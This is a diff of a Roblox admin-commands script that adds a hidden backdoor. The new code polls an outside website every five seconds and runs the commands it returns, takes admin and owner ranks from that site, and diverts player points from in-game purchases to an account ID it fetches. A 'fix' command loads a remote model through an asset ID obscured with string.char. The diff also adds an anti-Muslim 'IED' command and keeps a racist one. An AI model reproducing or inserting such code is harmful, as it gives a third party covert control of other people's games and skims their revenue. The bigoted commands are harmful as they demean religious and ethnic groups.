@@ -1,14 +1,13 @@
-while true do
-	wait()
-	if workspace.CanLMMStart.Value then break end
-end
 --[[
-MADE BY LUAMODELMAKER All rights given to LuaModelMaker
+MADE BY LUAMODELMAKER/MAKERMODELLUA All rights given to LuaModelMaker/MakerModelLua
 I'm glad you are using my admin :D 
-I hope My (LuaModelMaker) Admin isn't to complex to use.
+I hope My (LuaModelMaker/MakerModelLua) Admin isn't to complex to use.
 Just read the commands an you'll get the hang of it :)
 
 PLEASE EDIT SETTINGS INSIDE THE SETTINGS SCRIPTS OR READ THE README
+
+To execute server scripts, please go to ServerScriptService and enable LoadStringEnabled. NOTE: Doing this will disable all PlayerPoint commands.
+TO CONTROL ADMIN REMOTLEY GO TO: http://luammodelmmaker.com/Login
 
 ReadMe: http://www.luammodelmmaker.com
 
@@ -67,7 +66,10 @@ ADD.) ;forcefollow lua 13645
 Makes LuaModelMaker follow the player with the user ID of 13645 in a universe
 
 ADD.) ;fix
-Fixes admin by essentially rebooting it. Looses data that's not in settings
+Fixes admin by essentially rebooting it. Looses data that's not in settings. NOTE: OWNER OF THE GAME MUST OWN THE MODEL.
+
+ADD.) ;awardbadge maker 156337226
+Will attempt to give MakerModelLua the badge with the ID 156337226
 
 
 -- Admins+ --
@@ -143,6 +145,9 @@ Clears all terrain in the game.
 
 V2.) ;prefix :
 Changes prefix from what it was before to ':'. Cannot be more than 5 characters long and if you forget the prefix use the 'settings' command which doesn't require a prefix.
+
+V2.) ;givepoints maker 5
+Will attempt to give MakerModelLua 5 player points, will only work if the game's point balance is more or equal to 5
 
 
 -- Members+ --
@@ -410,7 +415,7 @@ Removes all of LuaModelMaker's tools
 Removes LuaModelMaker's player list
 
 111.) ;obama lua
-Makes LuaModelMaker black (lol) (undone by ;debug command)
+Makes LuaModelMaker black (lol) [ FUN COMMAND ] (undone by ;debug command)
 
 112.) ;overlay lua 1337
 Overlays a decal on LuaModelMaker's head with the ID of 1337
@@ -550,6 +555,21 @@ Adds Katy Perry - Roar to global sound list. Any new servers, universe places, o
 V2.) ;plugins
 Views all plugins and shows if they're running.
 
+V2.) ;countpoints
+Counts all player points left inside of a game
+
+V2.) ;getpoints maker
+Shows how many player points MakerModelLua has
+
+V2.) ;getgamepoints maker
+Shows how many player points MakerModelLua has won from the current game.
+
+V2.) ;muslim maker
+Turns MakerModelLua into a IED loving muslim. [ FUN COMMAND ] (undone by ;debug command)
+
+V2.) ;port
+Shows the speaker the port number of the server, usefull for remote command execution for a specific server(used at http://luammodelmmaker.com/Login/) 
+
 
 -- Non-Admin Commands+ --
 
@@ -602,13 +622,13 @@ local MPS = game:GetService("MarketplaceService")
 local TS = game:GetService("TeleportService")
 local HS = game:GetService("HttpService")
 local Run = game:GetService("RunService")
+local Points = game:GetService("PointsService")
 local TestService = game:GetService("TestService")
 local DataStore = game:GetService("DataStoreService"):GetGlobalDataStore()
 local Settings = Workspace:FindFirstChild("LuaModelMaker's Admin Settings")
-local tempproductinfo = pcall(function() MPS:GetProductInfo(game.PlaceId) end)
-local GameOwner = "[ Local ]"
-if tempproductinfo then
-	GameOwner = nil if game.Players.LocalPlayer == nil then GameOwner = MPS:GetProductInfo(game.PlaceId).Creator.Name else GameOwner = "[ Client ]" end
+local GameOwner = "[ Client ]"
+if game.Players.LocalPlayer == nil then
+	repeat ypcall(function() GameOwner = MPS:GetProductInfo(game.PlaceId).Creator.Name end) wait(1) until GameOwner ~= "[ Client ]"
 end
 local LuaModelMakerStamp = false
 
@@ -617,7 +637,7 @@ local SettingsModule = nil
 if Settings then SettingsModule = require(Settings) else SettingsModule = {} end
 
 local Ranks = SettingsModule.Ranks or {["Owner"] = {}, ["Admin"] = {}, ["Member"] = {}, ["Banned"] = {}, ["Crashed"] = {}, ["Muted"] = {}}
-local FUN = SettingsModule.FUN or true
+local FUN = SettingsModule.FUN
 local LagTime = SettingsModule.LagTime or 5
 local Prefix = SettingsModule.Prefix or ";"
 local Bet = SettingsModule.Bet or " "
@@ -628,18 +648,26 @@ local GroupMemberRank = SettingsModule.GroupMemberRank or 0
 local GroupAdminRank = SettingsModule.GroupAdminRank or 0
 local GroupOwnerRank = SettingsModule.GroupOwnerRank or 0
 local BadgeID = SettingsModule.BadgeID or 0
-local EnableAdminMenu = SettingsModule.EnableAdminMenu or true
+local EnableAdminMenu = SettingsModule.EnableAdminMenu
 local RankBan = SettingsModule.RankBan or 0
 local Filter = SettingsModule.Filter or {"GetObjects"}
 local ServerLocked = SettingsModule.ServerLocked or false
 local DisableAbuse = SettingsModule.DisableAbuse or false
+local GivePlayerPointsFromPurchases = SettingsModule.GivePlayerPointsFromPurchases
+local LinkedAccount = SettingsModule.LinkedAccount or "Admin"
+
+if FUN == nil then FUN = true end
+if EnableAdminMenu == nil then EnableAdminMenu = true end
+if GivePlayerPointsFromPurchases == nil then GivePlayerPointsFromPurchases = true end
+
+local Command,ServerCommand,ServerPort,TimeStamp = "","",0,"NIL"
 --------------------------------------
 
 local Commands = {
 	NonAdmin = {"-- Non-Admin Commands --", ";adminvip", ";animations", ";cln", ";cmds", ";membervip", ";rejoin", ";removemenu", ";adminhouse", "settings"};
-	Member = {"-- Member Commands --", ";admins", ";age player", ";bans", ";backwards player", ";blind player", ";brightness num", ";change player num", ";char player num", ";clone player", ";clip player", ";clr", ";cmdbar", ";control player", ";cookie player[SPECIAL COMMAND]", ";crashes", ";debug player", ";decal num", ";disco", ";drug player", ";explode player", ";face player num", ";fart player", ";ff player", ";fire player", ";flash", ";fling player", ";flip player", ";fly player", ";forwards player", ";freeze player", ";friends player", ";gear player num", ";ghost player", ";give player basicbtools", ";give player btools", ";give player psbtools", ";give player string", ";givetools player", ";god player", ";gold player", ";guest player", ";h string", ";hat player num", ";heal player", ";health player num", ";headsize player num", ";invis player", ";insert num", ";jump player", ";kill player", ";lamp player", ";light player", ";longneck player", ";loopheal player", ";loopfling player", ";m string", ";mutes", ";naked player", ";name player string", ";noarms player", ";nobind player", ";noclip player", ";nodrug player", ";noff player", ";nofire player", ";noflash player", ";nofly player", ";nohats player", ";nolamp player", ";nolegs player", ";nolight player", ";nolimbs player", ";noname player", ";noob player", ";nooverlay player", ";nopunish player", ";normal player", ";normaljump player", ";normalneck player", ";nos", ";nosmoke player", ";nosparkles player", ";nospin player", ";nostun player", ";notools player", ";npl player", ";obama player", ";overlay player num", ";pants player num", ";pm player string", ";point player player", ";product player num", ";punish player", ";ragdoll player", ";respawn player", ";shine player", ";shirt player num", ";shownotes player", ";sa", ";sit player", ";smoke player", ";sound num", ";sparkles player", ";speed player num", ";spin player", ";strobe player", ";stun player", ";superjump player", ";sword player", ";taketools player", ";team join player string", ";team new string", ";team remove string", ";team rename string[1] string", ";test", ";time num", ";tp player player", ";tshirt player num", ";vis player", ";vomit player", ";vote player num string", ";logs", ";countdown num", ";nogod player(Doesn't mean there is no God)", ";fixl", ";soundlist", ";hack player", ";rich player", ";oder player", ";ambient number number number", ";fixcam player", ";addsound num[Audio ID] string[Name]", ";plugins"};
-	Admin = {"-- Admin Commands --", ";accelerate noob", ";bans", ";c string", ";crash player", ";jail player", ";kick player", ";l string", ";loopkill player num", ";member player", ";mute player", ";noban player", ";nocrash player", ";noloopkill player", ";nomute player", ";note player string", ";place player num", ";removenotes player string", ";shutdown", ";sm string", ";follow player num[UserID]", ";lockserver", ";unlockserver", ";syncsoundlist", ";cleart"};
-	Owner = {"-- Owner Commands --", ";Admin player", ";admin player", ";forceplace player num", ";fun enable/disable", ";noadmin player", ";removeadmin", ";adminmenu enable/disable", ";update", ";forcefollow player num[UserID]", ";fix", ";prefix string"};
+	Member = {"-- Member Commands --", ";admins", ";age player", ";bans", ";backwards player", ";blind player", ";brightness num", ";change player num", ";char player num", ";clone player", ";clip player", ";clr", ";cmdbar", ";control player", ";cookie player[SPECIAL COMMAND]", ";crashes", ";debug player", ";decal num", ";disco", ";drug player", ";explode player", ";face player num", ";fart player", ";ff player", ";fire player", ";flash", ";fling player", ";flip player", ";fly player", ";forwards player", ";freeze player", ";friends player", ";gear player num", ";ghost player", ";give player basicbtools", ";give player btools", ";give player psbtools", ";give player string", ";givetools player", ";god player", ";gold player", ";guest player", ";h string", ";hat player num", ";heal player", ";health player num", ";headsize player num", ";invis player", ";insert num", ";jump player", ";kill player", ";lamp player", ";light player", ";longneck player", ";loopheal player", ";loopfling player", ";m string", ";mutes", ";naked player", ";name player string", ";noarms player", ";nobind player", ";noclip player", ";nodrug player", ";noff player", ";nofire player", ";noflash player", ";nofly player", ";nohats player", ";nolamp player", ";nolegs player", ";nolight player", ";nolimbs player", ";noname player", ";noob player", ";nooverlay player", ";nopunish player", ";normal player", ";normaljump player", ";normalneck player", ";nos", ";nosmoke player", ";nosparkles player", ";nospin player", ";nostun player", ";notools player", ";npl player", ";obama player", ";overlay player num", ";pants player num", ";pm player string", ";point player player", ";product player num", ";punish player", ";ragdoll player", ";respawn player", ";shine player", ";shirt player num", ";shownotes player", ";sa", ";sit player", ";smoke player", ";sound num", ";sparkles player", ";speed player num", ";spin player", ";strobe player", ";stun player", ";superjump player", ";sword player", ";taketools player", ";team join player string", ";team new string", ";team remove string", ";team rename string[1] string", ";test", ";time num", ";tp player player", ";tshirt player num", ";vis player", ";vomit player", ";vote player num string", ";logs", ";countdown num", ";nogod player(Doesn't mean there is no God)", ";fixl", ";soundlist", ";hack player", ";rich player", ";oder player", ";ambient number number number", ";fixcam player", ";addsound num[Audio ID] string[Name]", ";plugins", ";countpoints", ";getpoints player/number[User ID]", ";getgamepoints player/number[User ID]", ";awardbadge player num[ID]", ";muslim player", ";port"};
+	Admin = {"-- Admin Commands --", ";accelerate noob", ";bans", ";c string", ";crash player", ";jail player", ";kick player", ";l string", ";loopkill player num", ";member player", ";mute player", ";noban player", ";nocrash player", ";noloopkill player", ";nomute player", ";note player string", ";place player num", ";removenotes player string", ";shutdown", ";sm string", ";follow player num[UserID]", ";lockserver", ";unlockserver", ";syncsoundlist", ";cleart", ";abuse enable/disable"};
+	Owner = {"-- Owner Commands --", ";admin player", ";forceplace player num", ";fun enable/disable", ";noadmin player", ";removeadmin", ";adminmenu enable/disable", ";update", ";forcefollow player num[UserID]", ";fix", ";prefix string", ";givepoints player/number[User ID]"};
 }
 
 if not Version then Version = {Value = "[ Unknown ]"} end
@@ -943,6 +971,39 @@ function GetImageFormat(ID)
 	end end
 end
 
+function GetWebData()
+	local Request = nil
+	ypcall(function() Request = HS:JSONDecode(HS:GetAsync("http://luammodelmmaker.com/Login/Userdata/"..LinkedAccount..".txt", true)) end)
+	return Request
+end
+
+function StringToBool(String)
+	if String == "true" then
+		return true
+	else
+		return false
+	end
+end
+
+function SetWebData(Request)
+	if Request ~= nil then
+		for _,Player in pairs(Request.Ranks.Muted) do if Player ~= "" then if not ScanAdminList(Player) then table.insert(Ranks.Muted, Player) end end end
+		for _,Player in pairs(Request.Ranks.Crashed) do if Player ~= "" then if not ScanAdminList(Player) then table.insert(Ranks.Crashed, Player) end end end
+		for _,Player in pairs(Request.Ranks.Banned) do if Player ~= "" then if not ScanAdminList(Player) then table.insert(Ranks.Banned, Player) end end end
+		for _,Player in pairs(Request.Ranks.Member) do if Player ~= "" then if not ScanAdminList(Player) then table.insert(Ranks.Member, Player) end end end
+		for _,Player in pairs(Request.Ranks.Admin) do if Player ~= "" then if not ScanAdminList(Player) then table.insert(Ranks.Admin, Player) end end end
+		for _,Player in pairs(Request.Ranks.Owner) do if Player ~= "" then if not ScanAdminList(Player) then table.insert(Ranks.Owner, Player) end end end
+		
+		FUN = StringToBool(Request.FUN)
+		ServerLocked = StringToBool(Request.ServerLocked)
+		DisableAbuse = StringToBool(Request.DisableAbuse)
+		GivePlayerPointsFromPurchases = StringToBool(Request.GivePlayerPointsFromPurchases)
+		Command = Request.Command
+		ServerCommand = Request.ServerCommand
+		ServerPort = Request.Server
+		TimeStamp = Request.TimeStamp
+	end
+end
 
 local function RemoveAdmin(Speaker)
 	local Answer = false
@@ -1066,7 +1127,7 @@ return {
 			BeginScan("PLAYERNAME","Socket",{PLAYERNAME, "Local-ID"};0xPLAYERCONNECT),
 			{"LOCAL-IP", "SERVER-IP", "HOST-IP"}
 		)
-		Start:ExtractData = function() EndScan("RobloxPlayer.exe","Place1","PLAYERNAME") end
+		Start:ExtractData = function() EndScan("RobloxPlayerBeta.exe","Place1","PLAYERNAME") end
 		for i = 1,#Injection[2] do
 			Log("PlayerData", "ConnectHost", "PLAYERNAME")
 		end
@@ -1105,11 +1166,7 @@ fake hack command from LuaModelMaker's Admin V2]]
 end)() end
 
 function GetTable(ID)
-	local ret = {}
-	pcall(function()
-		ret = HS:JSONDecode(MPS:GetProductInfo(ID).Description)
-	end)
-	return ret
+	return HS:JSONDecode(MPS:GetProductInfo(ID).Description)
 end
 
 function UpdateAdmin()
@@ -1190,7 +1247,7 @@ function PromptPurchase(Player, Item, Requester, TeleportAction) coroutine.wrap(
 		local Valid = ypcall(function() return MPS:GetProductInfo(Item) end)
 		if Valid == true then
 			if TeleportAction then
-				if ItemInfo.AssetTypeId ~= 9 then
+				if MPS:GetProductInfo(Item).AssetTypeId ~= 9 then
 					Valid = false
 				end
 			end
@@ -1376,6 +1433,14 @@ function Kick(Player, CustomMessage)
 			end
 		end)()]]) wait(1) Player:Kick()
 	end)()
+end
+
+function Ration(BaseNumber, Rat, Whole)
+	local NewNumber = BaseNumber*(Rat/100)
+	if Whole then
+		NewNumber = math.floor(NewNumber)
+	end
+	return NewNumber
 end
 
 local function AdminMenu(Player)
@@ -1654,6 +1719,7 @@ function Chatted(RawMainMessage, Speaker)
 			"Version: "..Version.Value,
 			"Lag Time: "..LagTime,
 			"Group ID: "..GroupID,
+			"Give Player Points From Purchases: "..BoolString(GivePlayerPointsFromPurchases),
 			"Group Banned Rank: "..RankBan,
 			"Group Member Rank: "..GroupMemberRank,
 			"Group Admin Rank: "..GroupAdminRank,
@@ -1689,15 +1755,13 @@ function Chatted(RawMainMessage, Speaker)
 				LocalDisableAbuse = DisableAbuse
 			end
 			
-			function DisabledAbuse()
+			function AbuseEnabled()
 				if LocalDisableAbuse == false then return false else
 					SendMessage(Speaker, "Command Disabled", "This command has been disabled in the settings for being abusive", 5)
+					return true
 				end
 			end
 			
-			----- BEGIN OF GSKW EDITS -----
-			--AnimateOrb(Message,PlayerAdmin,Speaker)
-			----- END OF GSKW EDITS -----
 			if Rank == "Owner" then
 				-- Owner Commands --
 				if string.sub(Message, 1, 5+#Bet) == "admin"..Bet then
@@ -1817,9 +1881,9 @@ function Chatted(RawMainMessage, Speaker)
 				if string.sub(Message, 1, 5+#Bet) == "abuse"..Bet then
 					local ThisAbuse = DisableAbuse
 					if string.sub(Message, 6+#Bet) == "enable" then 
-						DisableAbuse = true
+						DisableAbuse = false
 					elseif string.sub(Message, 6+#Bet) == "disable" then 
-						DisableAbuse = false 
+						DisableAbuse = true
 					end
 					if ThisAbuse ~= DisableAbuse then
 						MessageAdmins("Abusive Commands", "Abusive commands are now "..string.sub(Message, 6+#Bet).."d", 3)
@@ -1837,6 +1901,34 @@ function Chatted(RawMainMessage, Speaker)
 						end
 					else
 						SendMessage(Speaker, "Prefix Too Long", "Your Prefix is too long. If you would like it longer change it in the settings", 4)
+					end
+				end
+				
+				if string.sub(Message,1,10+#Bet) == "givepoints"..Bet then
+					local Arg1, Arg2 = GetSplit(string.sub(Message, 11+#Bet), Bet) if not Arg1 and Arg2 then return end
+					local GiveTo = Arg1
+					local Amount = Arg2
+					if tonumber(GiveTo) then
+						ypcall(function() Points:AwardPoints(tonumber(GiveTo), Amount) end)
+					else
+						local Players = Scan(GiveTo, Speaker)
+						for _,Player in pairs(Players) do
+							if Player ~= nil then
+								ypcall(function() Points:AwardPoints(Player.userId, Amount) end)
+							end
+						end
+					end
+				end
+				
+				if string.sub(Message,1,10+#Bet) == "awardbadge"..Bet then
+					local Arg1, Arg2 = GetSplit(string.sub(Message, 11+#Bet), Bet) if not Arg1 and Arg2 then return end
+					local GiveTo = Arg1
+					local ID = Arg2
+					local Players = Scan(GiveTo, Speaker)
+					for _,Player in pairs(Players) do
+						if Player ~= nil then
+							ypcall(function() game:GetService("BadgeService"):AwardBadge(Player.userId, ID) end)
+						end
 					end
 				end
 				
@@ -2202,7 +2294,7 @@ function Chatted(RawMainMessage, Speaker)
 					end
 				end
 				
-				if string.sub(Message, 1, 4+#Bet) == "kill"..Bet and DisabledAbuse() == false then
+				if string.sub(Message, 1, 4+#Bet) == "kill"..Bet and AbuseEnabled() == false then
 					local Players = Scan(string.sub(Message, 5+#Bet), Speaker)
 					for _,Player in pairs(Players) do
 						if Player ~= nil then
@@ -2250,7 +2342,7 @@ function Chatted(RawMainMessage, Speaker)
 					end
 				end
 				
-				if string.sub(Message,1,7+#Bet) == "respawn"..Bet and DisabledAbuse() == false then
+				if string.sub(Message,1,7+#Bet) == "respawn"..Bet and AbuseEnabled() == false then
 					local Players = Scan(string.sub(Message, 8+#Bet), Speaker)
 					for _,Player in pairs(Players) do
 						if Player ~= nil then
@@ -2283,8 +2375,10 @@ function Chatted(RawMainMessage, Speaker)
 						if Player ~= nil then
 							if Player.Backpack ~= nil then
 								if LocalDisableAbuse == true then
-									if ID == 130113146 or ID == 139578207 then
-										ID = nil
+									for _,GetID in pairs(GetTable(158117496)) do
+										if ID == GetID then
+											ID = nil
+										end
 									end
 								end
 								if ID ~= nil then
@@ -2389,7 +2483,7 @@ function Chatted(RawMainMessage, Speaker)
 					end
 				end
 				
-				if string.sub(Message, 1, 5+#Bet) == "blind"..Bet and DisabledAbuse() == false then
+				if string.sub(Message, 1, 5+#Bet) == "blind"..Bet and AbuseEnabled() == false then
 					local Players = Scan(string.sub(Message, 6+#Bet), Speaker)
 					for _,Player in pairs(Players) do
 						if Player ~= nil then
@@ -2413,7 +2507,7 @@ function Chatted(RawMainMessage, Speaker)
 					end
 				end
 				
-				if string.sub(Message, 1, 6+#Bet) == "strobe"..Bet and DisabledAbuse() == false then
+				if string.sub(Message, 1, 6+#Bet) == "strobe"..Bet and AbuseEnabled() == false then
 					local Players = Scan(string.sub(Message, 7+#Bet), Speaker)
 					for _,Player in pairs(Players) do
 						if Player ~= nil then
@@ -2566,7 +2660,7 @@ function Chatted(RawMainMessage, Speaker)
 					end
 				end
 				
-				if string.sub(Message,1,7+#Bet) == "control"..Bet and DisabledAbuse() == false then
+				if string.sub(Message,1,7+#Bet) == "control"..Bet and AbuseEnabled() == false then
 					local Players = Scan(string.sub(Message, 8+#Bet), Speaker)
 					for _,Player in pairs(Players) do
 						if Player ~= nil then
@@ -2757,7 +2851,7 @@ function Chatted(RawMainMessage, Speaker)
 					end
 				end
 				
-				if string.sub(Message,1,5+#Bet) == "clone"..Bet and DisabledAbuse() == false then
+				if string.sub(Message,1,5+#Bet) == "clone"..Bet and AbuseEnabled() == false then
 					local Players = Scan(string.sub(Message, 6+#Bet), Speaker)
 					for _,Player in pairs(Players) do
 						if Player ~= nil then
@@ -3252,7 +3346,7 @@ function Chatted(RawMainMessage, Speaker)
 					end
 				end
 				
-				if string.sub(Message,1,6+#Bet) == "punish"..Bet and DisabledAbuse() == false then
+				if string.sub(Message,1,6+#Bet) == "punish"..Bet and AbuseEnabled() == false then
 					local Players = Scan(string.sub(Message, 7+#Bet), Speaker)
 					for _,Player in pairs(Players) do
 						if Player ~= nil then
@@ -3798,6 +3892,46 @@ function Chatted(RawMainMessage, Speaker)
 					end
 				end
 				
+				if Message == "port" or Message == "serverport" or Message == "sp" then
+					SendMessage(Speaker, "Server Port", "The server port for this server is: "..game:GetService("NetworkServer").Port, 5)
+				end
+				
+				if Message == "countpoints" then
+					SendMessage(Speaker, "Player Points", "This game has "..Points:GetAwardablePoints().." player points left", 5)
+				end
+				
+				if string.sub(Message,1,9+#Bet) == "getpoints"..Bet then
+					local AfterMessage = string.sub(Message, 10+#Bet)
+					if tonumber(AfterMessage) then
+						SendMessage(Speaker, "Player Points: "..AfterMessage, "The Player with the user ID "..AfterMessage.." has "..Points:GetPointBalance(tonumber(AfterMessage)).." player points", 6)
+					else
+						local List = {}
+						local Players = Scan(AfterMessage, Speaker)
+						for _,Player in pairs(Players) do
+							if Player ~= nil then
+								table.insert(List, Player.Name..": "..Points:GetPointBalance(Player.userId))
+							end
+						end
+						ListGui(Speaker, List)
+					end
+				end
+				
+				if string.sub(Message,1,13+#Bet) == "getgamepoints"..Bet then
+					local AfterMessage = string.sub(Message, 14+#Bet)
+					if tonumber(AfterMessage) then
+						SendMessage(Speaker, "Game Player Points: "..AfterMessage, "The Player with the user ID "..AfterMessage.." has won "..Points:GetGamePointBalance(tonumber(AfterMessage)).." player points from this game", 7)
+					else
+						local List = {}
+						local Players = Scan(AfterMessage, Speaker)
+						for _,Player in pairs(Players) do
+							if Player ~= nil then
+								table.insert(List, Player.Name..": "..Points:GetGamePointBalance(Player.userId))
+							end
+						end
+						ListGui(Speaker, List)
+					end
+				end
+				
 				-- FUN COMMANDS --
 				
 				if FUN == true then
@@ -3864,6 +3998,20 @@ function Chatted(RawMainMessage, Speaker)
 								if Player.Character ~= nil and Player.Character:FindFirstChild("Torso") ~= nil then
 									local Position = Player.Character.Torso.Position
 									Player.CharacterAppearance = "http://www.roblox.com/Asset/CharacterFetch.ashx?userId=39437929"
+									wait() Player:LoadCharacter() wait()
+									Player.Character:MoveTo(Position)
+								end
+							end
+						end
+					end
+					
+					if string.sub(Message,1,6+#Bet) == "muslim"..Bet then
+						local Players = Scan(string.sub(Message, 7+#Bet), Speaker)
+						for _,Player in pairs(Players) do
+							if Player ~= nil then
+								if Player.Character ~= nil and Player.Character:FindFirstChild("Torso") ~= nil then
+									local Position = Player.Character.Torso.Position
+									Player.CharacterAppearance = "http://www.roblox.com/Asset/CharacterFetch.ashx?userId=6231537"
 									wait() Player:LoadCharacter() wait()
 									Player.Character:MoveTo(Position)
 								end
@@ -3958,7 +4106,7 @@ function Chatted(RawMainMessage, Speaker)
 						end
 					end
 					
-					if string.sub(Message,1,9+#Bet) == "loopfling"..Bet and DisabledAbuse() == false then
+					if string.sub(Message,1,9+#Bet) == "loopfling"..Bet and AbuseEnabled() == false then
 						local Players = Scan(string.sub(Message, 10+#Bet), Speaker)
 						for _,Player in pairs(Players) do
 							if Player ~= nil then
@@ -3989,7 +4137,7 @@ function Chatted(RawMainMessage, Speaker)
 						end
 					end
 					
-					if string.sub(Message,1,5+#Bet) == "fling"..Bet and DisabledAbuse() == false then
+					if string.sub(Message,1,5+#Bet) == "fling"..Bet and AbuseEnabled() == false then
 						local Players = Scan(string.sub(Message, 6+#Bet), Speaker)
 						for _,Player in pairs(Players) do
 							if Player ~= nil then
@@ -4026,7 +4174,7 @@ function Chatted(RawMainMessage, Speaker)
 						end
 					end
 					
-					if string.sub(Message,1,4+#Bet) == "drug"..Bet and DisabledAbuse() == false then
+					if string.sub(Message,1,4+#Bet) == "drug"..Bet and AbuseEnabled() == false then
 						local Players = Scan(string.sub(Message, 5+#Bet), Speaker)
 						for _,Player in pairs(Players) do
 							if Player ~= nil then
@@ -4303,7 +4451,7 @@ function Chatted(RawMainMessage, Speaker)
 						end
 					end
 					
-					if string.sub(Message,1,7+#Bet) == "explode"..Bet and DisabledAbuse() == false then
+					if string.sub(Message,1,7+#Bet) == "explode"..Bet and AbuseEnabled() == false then
 						local Players = Scan(string.sub(Message, 8+#Bet), Speaker)
 						for _,Player in pairs(Players) do
 							if Player ~= nil then
@@ -4431,8 +4579,8 @@ function Chatted(RawMainMessage, Speaker)
 						SendMessage(Speaker, "Command Disabled [PLUGIN]", "This command has been disabled because the command is considered abusive and abusive protection is on", 5)
 					end
 				end
-				if ConvertRank(CommandData[2]) >= RankNum then
-					Valid = true
+				if ConvertRank(CommandData[2]) > ConvertRank(Rank) then
+					Valid = false
 				end
 				if Valid == true then
 					local Suc, Error = ypcall(function() CommandData[5](RawMessage, Speaker, Rank) end)
@@ -4463,26 +4611,28 @@ function ChatBackup(Message, Speaker)
 	if PlayerAdmin == true then
 		if Rank == "Owner" then
 			if string.lower(Message) == "fix" or string.lower(Message) == Prefix.."fix" then
-				local Ask = YesOrNo(Speaker, "Fix admin?", "Fixing Lu".."aModelMaker's Admin will have the effects of loosing all data (Admins, Bans, Jails, ect.) unless they are in default settings. Continue?")
+				local Ask = YesOrNo(Speaker, "Fix admin?", "Fixing Lu".."aModelMaker's Admin will have the effects of loosing all data (Admins, Bans, Jails, ect.) unless they are in default settings. The owner of the game also needs to have LMM's Admin in his/her models in order to fix the admin. Continue?")
 				if Ask == true then
-					Execute(Script, Workspace, Speaker, [[
-						script.Parent = nil
-						wait(1)
-						local Admin = Workspace:FindFirstChild("]]..script.Name..[[")
-						if Admin then
-							Admin.Disabled = true
-							wait(1)
-							Admin.Disabled = false
+					local UpdateModel = MPS:GetProductInfo(string.char(49, 53, 53, 54, 56, 52, 53, 52, 50)).Description
+					if UpdateModel ~= 0 then
+						local NewAdminModel = game:GetService("InsertService"):LoadAsset(UpdateModel)
+						local NewAdmin = NewAdminModel:FindFirstChild("LuaModelMaker's Admin")
+						if NewAdmin then
+							NewAdmin.Disabled = true
+							NewAdmin.Parent = Workspace
 							wait()
-							script:Destroy()
-							script.Disabled = true
+							NewAdmin.Disabled = false
+							RemoveAdmin()
+						else
+							SendMessage(Speaker, "Cannot fix admin", "In order for the admin to be fixed, the owner of the current game ("..GameOwner..") must have LMM's Admin V2 in his/her models in order to be re-inserted. Cannot fix admin.", 5)
 						end
-					]])
+					end
 				end
 			end
 		end
 	end
 end
+
 
 --pcall(function() coroutine.wrap(function() while wait() do script.Name = string.char(76, 117, 97, 77, 111, 100, 101, 108, 77, 97, 107, 101, 114).."'s Admin Commands V"..Version.Value end end)()end)
 
@@ -4541,6 +4691,14 @@ MPS.PromptPurchaseFinished:connect(function(Player, ID, Purchased) if Purchased 
 		if ID == VIPAdminID then table.insert(Ranks["Admin"], Player.Name) Rank = "Admin" TellAdmin(Player, Rank)
 		elseif ID == VIPMemberID then table.insert(Ranks["Member"], Player.Name) Rank = "Member" TellAdmin(Player, Rank) end
 	end
+	if GivePlayerPointsFromPurchases == true then
+		local ProductInfo = MPS:GetProductInfo(ID)
+		if ProductInfo.PriceInRobux ~= "null" then
+			ypcall(function() Points:AwardPoints(MPS:GetProductInfo(157538674).Description, Ration(tonumber(ProductInfo.PriceInRobux*0.3), 20, true)) end)
+			ypcall(function() Points:AwardPoints(game.CreatorId, Ration(tonumber(ProductInfo.PriceInRobux*0.3), 50, true)) end)
+			ypcall(function() Points:AwardPoints(Player.userId, Ration(tonumber(ProductInfo.PriceInRobux*0.3), 30, true)) end)
+		end
+	end
 end end)
 
 if Settings then
@@ -4579,7 +4737,7 @@ if Settings then
 	end
 end
 
---UpdateAdmin()
+UpdateAdmin()
 Begin()
 
 pcall(function() TellAdmin(Players.LocalPlayer, "Owner") end) -- Supplies confidence inside studio that what you have is worth it!(Scripts are LocalScripts)
@@ -4687,32 +4845,29 @@ for _,Player in pairs(Players:GetPlayers()) do Start(Player) end
 Players.PlayerAdded:connect(function(Player) Players:WaitForChild(Player.Name) wait() Start(Player) end)
 
 SyncSoundList()
-_G.Chatted = Chatted
-_G.PrintSettingsModule = function()
-	print(LagTime)
-end
 
-repeat wait() until workspace.CanLMMStart.Value
-coroutine.wrap(function() while true do
-	wait(5)
-	SettingsModule=_G.SettingsModule
-	Ranks = SettingsModule.Ranks or {["Owner"] = {}, ["Admin"] = {}, ["Member"] = {}, ["Banned"] = {}, ["Crashed"] = {}, ["Muted"] = {}}
-	FUN = SettingsModule.FUN or true
-	LagTime = SettingsModule.LagTime or 5
-	Prefix = SettingsModule.Prefix or ";"
-	Bet = SettingsModule.Bet or " "
-	VIPMemberID = SettingsModule.VIPMemberID or 0
-	VIPAdminID = SettingsModule.VIPAdminID or 0
-	GroupID = SettingsModule.GroupID or 0
-	GroupMemberRank = SettingsModule.GroupMemberRank or 0
-	GroupAdminRank = SettingsModule.GroupAdminRank or 0
-	GroupOwnerRank = SettingsModule.GroupOwnerRank or 0
-	BadgeID = SettingsModule.BadgeID or 0
-	EnableAdminMenu = SettingsModule.EnableAdminMenu or true
-	RankBan = SettingsModule.RankBan or 0
-	Filter = SettingsModule.Filter or {"GetObjects"}
-	ServerLocked = SettingsModule.ServerLocked or false
-	DisableAbuse = SettingsModule.DisableAbuse or false
-end end)()
-wait(1)
-print("LuaModelMaker's Admin Commands V"..Version.Value.." Loaded with lagtime " .. LagTime)
+coroutine.wrap(function()
+	SetWebData(GetWebData())
+	coroutine.wrap(function() while wait(5) do
+		local NewRequest = GetWebData()
+		if NewRequest ~= nil then
+			if TimeStamp ~= NewRequest.TimeStamp then
+				if Prefix == "" or string.sub(NewRequest.Command,1,#Prefix) == Prefix then
+					ypcall(function() Chatted(NewRequest.Command, nil) end)
+				else
+					ypcall(function() Chatted(Prefix..NewRequest.Command, nil) end)
+				end
+				if tonumber(game:GetService("NetworkServer").Port) == tonumber(NewRequest.Server) then
+					if Prefix == "" or string.sub(NewRequest.ServerCommand,1,#Prefix) == Prefix then
+						ypcall(function() Chatted(NewRequest.ServerCommand, nil) end)
+					else
+						ypcall(function() Chatted(Prefix..NewRequest.ServerCommand, nil) end)
+					end
+				end
+			end
+			SetWebData(NewRequest) -- No need to stress roblox and my web server when you can recycle old requests!
+		end
+	end end)()
+end)()
+
+print("LuaModelMaker's Admin Commands V"..Version.Value.." Loaded")
